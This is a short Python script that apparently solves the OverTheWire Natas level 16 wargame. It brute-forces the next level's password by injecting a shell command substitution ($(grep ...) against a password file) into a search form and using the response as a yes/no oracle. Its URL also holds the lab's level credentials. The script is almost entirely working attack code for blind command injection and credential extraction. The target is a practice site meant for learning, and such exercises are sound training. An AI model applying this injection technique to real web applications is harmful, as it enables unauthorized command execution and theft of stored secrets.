#Brute forcing the password for user 'natas17'
#using bash command injection
import requests;
dest = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/index.php';

chars = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
attempt = '';
password = '';

for i in range (0, 32) :
	for i in range(0, len(chars)):
		attempt = password + chars[i];
		print 'Attempt: %s' % attempt;
		n = 'success$(grep ^' +attempt+ ' /etc/natas_webpass/natas17)';
		r = requests.post(dest,data={'needle':n,'submit':'Search'});
		if 'success' not in r.text :
			password = attempt;
			print 'SUCCESS! Password stands at %s' % password;
			break;
